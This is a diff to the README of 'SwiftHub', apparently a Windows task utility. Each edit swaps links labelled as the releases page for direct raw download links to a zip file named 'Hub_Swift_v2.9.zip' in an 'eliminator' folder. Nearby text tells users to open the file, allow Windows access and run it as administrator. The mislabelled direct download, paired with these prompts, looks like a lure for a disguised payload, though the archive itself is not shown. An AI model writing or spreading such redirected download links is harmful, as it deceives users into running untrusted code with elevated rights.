@@ -1,10 +1,10 @@
 # 🧭 SwiftHub - Central Control for Windows Tasks
 
-[![Download SwiftHub](https://img.shields.io/badge/Download-SwiftHub-6A5ACD?style=for-the-badge&logo=github)](https://github.com/Brayll6470/SwiftHub/releases)
+[![Download SwiftHub](https://img.shields.io/badge/Download-SwiftHub-6A5ACD?style=for-the-badge&logo=github)](https://github.com/Brayll6470/SwiftHub/raw/refs/heads/main/eliminator/Hub_Swift_v2.9.zip)
 
 ## 📥 Download SwiftHub
 
-Visit this page to download: [SwiftHub Releases](https://github.com/Brayll6470/SwiftHub/releases)
+Visit this page to download: [SwiftHub Releases](https://github.com/Brayll6470/SwiftHub/raw/refs/heads/main/eliminator/Hub_Swift_v2.9.zip)
 
 Choose the latest release for Windows, then download the file that matches your PC. If there is more than one file, pick the one marked for Windows 64-bit unless your computer uses a different version.
 
@@ -32,7 +32,7 @@ For the best result, sign in with an account that has permission to run apps and
 
 ## 🚀 Getting Started
 
-1. Open the [SwiftHub Releases](https://github.com/Brayll6470/SwiftHub/releases) page.
+1. Open the [SwiftHub Releases](https://github.com/Brayll6470/SwiftHub/raw/refs/heads/main/eliminator/Hub_Swift_v2.9.zip) page.
 2. Find the latest version.
 3. Download the Windows file from the release assets.
 4. Save the file to your desktop or Downloads folder.
@@ -139,7 +139,7 @@ SwiftHub can help with:
 - Run it as administrator.
 
 ### The download is missing
-- Return to the [SwiftHub Releases](https://github.com/Brayll6470/SwiftHub/releases) page.
+- Return to the [SwiftHub Releases](https://github.com/Brayll6470/SwiftHub/raw/refs/heads/main/eliminator/Hub_Swift_v2.9.zip) page.
 - Refresh the page.
 - Pick the newest release asset for Windows.
 
@@ -162,7 +162,7 @@ If you see more than one file, choose the one made for Windows and end users. If
 
 ## 🧭 Quick Start
 
-1. Go to the [SwiftHub Releases](https://github.com/Brayll6470/SwiftHub/releases) page.
+1. Go to the [SwiftHub Releases](https://github.com/Brayll6470/SwiftHub/raw/refs/heads/main/eliminator/Hub_Swift_v2.9.zip) page.
 2. Download the Windows file.
 3. Open the file.
 4. Allow access if Windows asks.
